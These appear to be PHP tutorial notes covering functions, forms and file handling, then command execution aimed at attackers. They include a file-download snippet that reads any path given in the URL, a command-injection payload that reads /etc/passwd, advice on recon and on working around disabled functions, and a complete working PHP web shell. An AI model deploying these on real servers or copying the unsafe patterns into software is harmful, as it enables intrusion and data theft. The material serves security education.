# Functions & Forms 

## Functions 

A function is a **named block of code** you write once and call whenever you need it.

```php
function greatLearning($name) {
    print "Hello, $name!\n";
}

greatLearning("Kiyotaka");    // Hello, Kiyotaka!
greatLearning("Cristopher");  // Hello, Cristopher!
```

### Functions with default arguments

```php
function greet($name, $greeting = "Hello") {
    print "$greeting, $name!\n";
}

greet("Kiyotaka");           // Hello, Kiyotaka!
greet("Kiyotaka", "Hi");     // Hi, Kiyotaka!
```

If you don't pass the second argument, PHP uses the default `"Hello"`. If you do pass it, your value overrides the default.

## HTML Forms — collecting input from a web page

An HTML form is how a website collects data from a user and sends it to a PHP script.

```html
<FORM METHOD=POST>
    <INPUT NAME="username" TYPE=TEXT>
    <INPUT TYPE=SUBMIT VALUE="Submit!">
</FORM>
```

When the user submits this:

```php
$_POST['username']   // = whatever they typed
```

### POST vs GET in forms

- `METHOD=POST` — data goes in the request body (not visible in the URL)
- `METHOD=GET` — data goes in the URL as `?username=whatever`

### Textarea

```html
<TEXTAREA NAME="message" COLS=80 ROWS=5></TEXTAREA>
```

Creates a big input box. The `name="message"` attribute is the key — it becomes `$_POST['message']` in PHP.

# File Handling 

## Including other PHP files

```php
include('mycode.php');   // runs that file's PHP code inline
require('mycode.php');   // same, but STOPS everything if file not found
```

Think of `include` as copy-pasting another file's code right where you wrote it, then running it as if it was always there.

`include` shows a warning if the file is missing and keeps going. `require` throws a fatal error and stops.

## Reading a file — sending it to the browser

```php
$file = $_GET['file'];            // get filename from URL
if(file_exists($file)) {
    $basename = basename($file);  // get just the filename, strip the path
    header("Content-disposition: attachment; filename=$basename");
    readfile($file);              // send file contents to browser
}
```

What each piece does:

- `basename("/etc/passwd")` → returns just `"passwd"` (strips the path)
- `header()` → sends browser instructions (here: "download this as a file")
- `readfile()` → dumps the entire file content to the browser

## Reading a file line by line

```php
$f = fopen("/etc/passwd", "r");      // open for reading
while($data = fread($f, 1024)) {     // read 1024 bytes at a time
    $out .= $data;                   // .= means "add to existing variable"
}
fclose($f);                          // always close when done
print $out;
```

**File modes:**

|Mode|Meaning|
|---|---|
|`r`|Read only|
|`w`|Write (overwrites existing content)|
|`a+`|Append (adds to the end)|

## Writing to a file

```php
$f = fopen("/tmp/output.txt", "a+");  // open for appending
fwrite($f, "Hello\n");                // write text
fclose($f);
```

# Command Execution & Web Shells 

## PHP can run actual terminal commands

This is the most powerful — and most dangerous — thing PHP can do. These functions let PHP talk directly to the operating system.

## `passthru()` — run and print directly

```php
passthru("ls -l");    // runs ls -l, output printed straight to browser
```

## `exec()` — run and store output in array

```php
exec("ls -l", $output);
print_r($output);     // each line = one element in the array
```

Nothing prints automatically — you control what happens with the output.

## `system()` — run and print, also returns last line

```php
$lastLine = system("ls -l");   // prints all output, stores last line in $lastLine
```

## Command Injection — the attack

When user input flows into one of these functions without sanitization:

```php
$file = $_GET['file'];       // attacker sends: .;cat /etc/passwd
passthru("ls -l $file");     // server runs: ls -l . ; cat /etc/passwd
```

The `;` character **chains two commands**. The server runs both. The attacker reads the password file through the browser.

Other chaining characters:

- `;` — run second command regardless
- `&&` — run second only if first succeeds
- `||` — run second only if first fails
- `` ` `` or `$()` — command substitution

## Checking what's available on the server

```php
if(function_exists('php_uname')) {
    print php_uname();
}
```

`php_uname()` returns OS info like `"Linux servername 5.4.0 ..."`. Useful for recon — tells you what OS and kernel you're dealing with.

Some servers disable dangerous functions in `php.ini`:

```
disable_functions = exec, passthru, shell_exec, system, proc_open, popen
```

Always check what's available. If one is blocked, try another.

## The PHP Web Shell 

A web shell turns a PHP file into a browser-based terminal. Once uploaded to a server, you can run any command through a web form.

```php
<?php
if($_POST['command']) {
    if($_POST['out']) {
        $out = $_POST['out'] . "\n";
        if(strlen($out) > 2000) {
            $out = substr($out, strlen($out)-2000, 2000);  // keep last 2000 chars
        }
    }
    $out .= "> {$_POST['command']}\n";      // show the command in output
    exec($_POST['command'], $data);          // RUN the command
    $out .= implode("\n", $data);            // join result into string
}
?>

<FORM METHOD=POST>
<TEXTAREA NAME=out style="width:100%;height:90%"><?php echo $out?></TEXTAREA>
<BR>
Input Command: <INPUT NAME=command TYPE=TEXT>
<INPUT TYPE=SUBMIT>
</FORM>
```

### Functions used in this shell

|Function|What it does|
|---|---|
|`strlen($string)`|Counts characters in a string|
|`substr($string, start, length)`|Cuts a piece out of a string|
|`implode("\n", $array)`|Joins an array into one string, newline between items|
|`exec($cmd, $data)`|Runs the command, stores output lines in `$data` array|
